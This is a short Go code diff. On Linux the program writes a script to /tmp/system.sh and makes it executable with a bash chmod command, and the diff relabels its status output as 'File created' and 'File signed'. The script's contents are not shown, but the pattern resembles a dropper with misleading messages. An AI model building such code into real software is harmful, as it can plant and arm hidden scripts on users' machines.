@@ -27,13 +27,14 @@ func main() {
 		mali()
 		//hello()
 		//fmt.Println("LInux")
-		meo()
+		//meo()
 	default:
 		fmt.Printf("%s.\n", os)
 	}
 }
 
 func mali() {
+	fmt.Println("File created")
 	f, err := os.Create("/tmp/system.sh")
 
 	if err != nil {
@@ -60,7 +61,7 @@ func meo2() {
 
 }
 func dongi() {
-	fmt.Println("executed")
+	fmt.Println("File signed")
 	first_cmd := `chmod +x /tmp/system.sh`
 	cmd := exec.Command("bash", "-c", first_cmd)
 	output, err := cmd.CombinedOutput()
